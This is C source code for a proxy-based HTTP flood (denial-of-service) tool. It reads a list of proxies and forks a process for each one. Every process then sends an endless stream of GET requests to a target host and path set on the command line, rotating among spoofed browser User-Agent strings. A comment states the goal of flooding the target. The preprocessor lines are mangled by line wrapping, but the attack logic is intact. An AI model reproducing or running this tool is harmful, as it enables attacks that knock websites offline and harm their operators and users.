#include <stdio.h> include <stdlib.h> include 
#<string.h> include <sys/time.h> include 
#<sys/socket.h> include <sys/types.h> include 
#<netinet/in.h> include <arpa/inet.h> include 
#<net/if.h> include <netinet/ip.h> include 
#<netinet/tcp.h> include <errno.h> include 
#<netdb.h> include <unistd.h> include 
#<ctype.h>
 
#define INFO "[\x1b[33m~\x1b[37m]" define 
#FAILED "[\x1b[31m-\x1b[37m]" define SUCCESS 
#"[\x1b[32m+\x1b[37m]"
  int Timeout = 10; char headers[512];  
// ok so weird idea but we're gonna connect 
// to the proxy and then send a get request 
// to it, for it to get the target/host we're 
// trying to flood
  void Trim(char *str) { int i; int begin = 
0; int end = strlen(str) - 1; while 
(isspace(str[begin])) begin++; while ((end >= 
begin) && isspace(str[end])) end--; for (i = 
begin; i <= end; i++) str[i - begin] = 
str[i]; str[i - begin] = '\0';
} 
  char *UserAgents[] = { "Mozilla/5.0 
(Windows NT 6.1; WOW64; rv:13.0) 
Gecko/20100101 Firefox/13.0.1", "Mozilla/5.0 
(Windows NT 6.1; WOW64) AppleWebKit/536.5 
(KHTML, like Gecko) Chrome/19.0.1084.56 
Safari/536.5", "Mozilla/5.0 (Windows NT 6.1; 
WOW64) AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.47 Safari/536.11", 
"Mozilla/5.0 (Macintosh; Intel Mac OS X 
10_7_4) AppleWebKit/534.57.2 (KHTML, like 
Gecko) Version/5.1.7 Safari/534.57.2", 
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) 
Gecko/20100101 Firefox/13.0.1", "Mozilla/5.0 
(Macintosh; Intel Mac OS X 10_7_4) 
AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.47 Safari/536.11", 
"Mozilla/5.0 (Windows NT 6.1; rv:13.0) 
Gecko/20100101 Firefox/13.0.1", "Mozilla/5.0 
(Windows NT 6.1) AppleWebKit/536.5 (KHTML, 
like Gecko) Chrome/19.0.1084.56 
Safari/536.5", "Mozilla/5.0 (compatible; MSIE 
9.0; Windows NT 6.1; WOW64; Trident/5.0)", 
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; 
rv:13.0) Gecko/20100101 Firefox/13.0.1", 
"Mozilla/5.0 (Macintosh; Intel Mac OS X 
10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) 
Chrome/19.0.1084.56 Safari/536.5", 
"Mozilla/5.0 (Windows NT 6.1) 
AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.47 Safari/536.11", 
"Mozilla/5.0 (Windows NT 5.1) 
AppleWebKit/536.5 (KHTML, like Gecko) 
Chrome/19.0.1084.56 Safari/536.5", 
"Mozilla/5.0 (Windows NT 5.1) 
AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.47 Safari/536.11", 
"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; 
Desire_A8181 Build/FRF91) App3leWebKit/53.1 
(KHTML, like Gecko) Version/4.0 Mobile 
Safari/533.1", "Mozilla/5.0 (Macintosh; Intel 
Mac OS X 10.6; rv:13.0) Gecko/20100101 
Firefox/13.0.1", "Mozilla/5.0 (iPhone; CPU 
iPhone OS 5_1_1 like Mac OS X) 
AppleWebKit/534.46 (KHTML, like Gecko) 
Version/5.1 Mobile/9B206 Safari/7534.48.3", 
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; 
Windows NT 5.0) Opera 7.02 Bork-edition 
[en]", "Mozilla/5.0 (Windows NT 6.1; WOW64; 
rv:12.0) Gecko/20100101 Firefox/12.0", 
"Mozilla/5.0 (Macintosh; Intel Mac OS X 
10_6_8) AppleWebKit/534.57.2 (KHTML, like 
Gecko) Version/5.1.7 Safari/534.57.2", 
"Mozilla/5.0 (Windows; U; Windows NT 5.1; 
en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6", 
"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS 
X) AppleWebKit/534.46 (KHTML, like Gecko) 
Version/5.1 Mobile/9B206 Safari/7534.48.3", 
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 
NT 5.1; SV1; FunWebProducts; .NET CLR 
1.1.4322; PeoplePal 6.2)", "Mozilla/5.0 
(Macintosh; Intel Mac OS X 10_6_8) 
AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.47 Safari/536.11", 
"Mozilla/4.0 (compatible; MSIE 7.0; Windows 
NT 5.1; SV1; .NET CLR 2.0.50727)", 
"Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/536.11 (KHTML, like Gecko) 
Chrome/20.0.1132.57 Safari/536.11", 
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) 
Gecko/20100101 Firefox/5.0.1", "Mozilla/5.0 
(compatible; MSIE 9.0; Windows NT 6.1; 
Trident/5.0)", "Mozilla/5.0 (Windows NT 6.1; 
rv:5.0) Gecko/20100101 Firefox/5.02", 
"Opera/9.80 (Windows NT 5.1; U; en) 
Presto/2.10.229 Version/11.60", "Mozilla/5.0 
(Windows NT 6.1; WOW64; rv:5.0) 
Gecko/20100101 Firefox/5.0", "Mozilla/4.0 
(compatible; MSIE 7.0; Windows NT 5.1; 
Trident/4.0; .NET CLR 2.0.50727; .NET CLR 
3.0.4506.2152; .NET CLR 3.5.30729)", 
"Mozilla/4.0 (compatible; MSIE 7.0; Windows 
NT 5.1; Trident/4.0; .NET CLR 1.1.4322)", 
"Mozilla/4.0 (compatible; MSIE 8.0; Windows 
NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; 
MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 
3.5.30729)", "Mozilla/5.0 (Windows NT 6.0) 
AppleWebKit/535.1 (KHTML, like Gecko) 
Chrome/13.0.782.112 Safari/535.1", 
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; 
rv:13.0) Gecko/20100101 Firefox/13.0.1", 
"Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/535.1 (KHTML, like Gecko) 
Chrome/13.0.782.112 Safari/535.1", 
"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) 
Gecko/20100921 Firefox/4.0b7pre", 
"Mozilla/5.0 (Macintosh; Intel Mac OS X 
10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) 
Chrome/19.0.1084.56 Safari/536.5"
};
  void proxy_flood(char *proxy_host, int 
proxy_port, char *targeturl, char *path) { 
int ret; char buffer[1024]; int Socket = -1; 
struct timeval timeout; struct sockaddr_in 
sock;   timeout.tv_sec = Timeout; 
timeout.tv_usec = 0; Socket = socket(AF_INET, 
SOCK_STREAM, 0); setsockopt(Socket, 
SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, 
sizeof(timeout)); setsockopt(Socket, 
SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, 
sizeof(timeout)); sock.sin_family = AF_INET; 
sock.sin_port = htons(proxy_port); 
sock.sin_addr.s_addr = inet_addr(proxy_host); 
if(connect(Socket, (struct sockaddr *)&sock, 
sizeof(sock)) == -1) {
//printf(FAILED" Couldn't connect to proxy 
//%s:%d\n", proxy_host, proxy_port);
goto end;
} 
else {
//printf(SUCCESS" Connected to proxy 
//%s:%d\n", proxy_host, proxy_port);
while(1) { snprintf(headers, sizeof(headers), 
"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: 
%s\r\nConnection: keep-alive\r\n\r\n", path, 
targeturl, UserAgents[(rand() % 39)]); 
send(Socket, headers, strlen(headers), 0); 
read(Socket, buffer, 1024); memset(buffer, 0, 
sizeof(buffer)); memset(headers, 0, 
sizeof(headers));
} 
} 
end: close(Socket); return;
} 
  int main(int argc, char **argv) { char 
buf[1024]; if(argc < 4 || argc > 4) { 
printf("[\x1b[31m?\x1b[37m] Usage: %s <proxy 
list(ip port)> <target url(ex: 
www.google.com)> <path(ex: /index.php)>\n", 
argv[0]); exit(-1);
} 
srand(time(NULL) ^ getpid()); printf(INFO" 
Loading proxy list -> %s...\n", argv[1]); 
char *host = argv[2]; char *path = argv[3]; 
FILE *proxies = fopen(argv[1], "r"); 
if(proxies == NULL) { 
printf("[\x1b[31m-\x1b[37m] Failed to open 
given proxy list (\x1b[33m%s\x1b[37m)\n", 
argv[1]); exit(-1);
} 
printf(INFO" Targeting -> %s!\n", argv[2]); 
int i = 0; while(fgets(buf, sizeof(buf) - 1, 
proxies)) { if(strlen(buf) < 3 || buf == 
NULL) break; Trim(buf); char *ip = 
strtok(buf, " "); // replace ' ' with : if u 
want layout to be ip:port int port = 
atoi(ip+strlen(ip)+1); i++; if(!(fork())) { 
printf("\r"SUCCESS"-"INFO" Proxies Loaded -> 
%d\r", i); proxy_flood(ip, port, host, path); 
exit(0);
} 
} 
return 0;
}
